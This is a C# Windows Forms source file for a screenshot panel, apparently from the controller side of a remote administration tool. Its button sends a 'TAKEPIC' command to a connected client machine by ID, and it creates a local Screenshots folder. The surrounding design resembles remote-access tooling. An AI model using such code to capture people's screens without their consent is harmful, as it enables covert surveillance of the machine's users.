using server.Classes;
using server.Others;
using System;
using System.IO;
using System.Windows.Forms;
namespace server.Forms
{
    public partial class frm_screenshot : Form
    {
        public frm_screenshot()
        {
            InitializeComponent();
        }
        public int ID;
        private void flatButton1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void flatButton2_Click(object sender, EventArgs e)
        {

            Form1.MainServer.Send(ID, Helper.Getbytes("TAKEPIC" + "~" + flatComboBox1.SelectedIndex), Common.Current_Key);
        }

        private void flatCheckBox1_CheckedChanged(object sender)
        {

        }

        private void frm_screenshot_Load(object sender, EventArgs e)
        {
            if (!Directory.Exists(Common.current_path + @"\Screenshots"))
            {
                Directory.CreateDirectory(Common.current_path + @"\Screenshots");
            }
        }

        private void flatToggle1_CheckedChanged(object sender)
        {
            this.TopMost = flatToggle1.Checked;
        }
    }
}
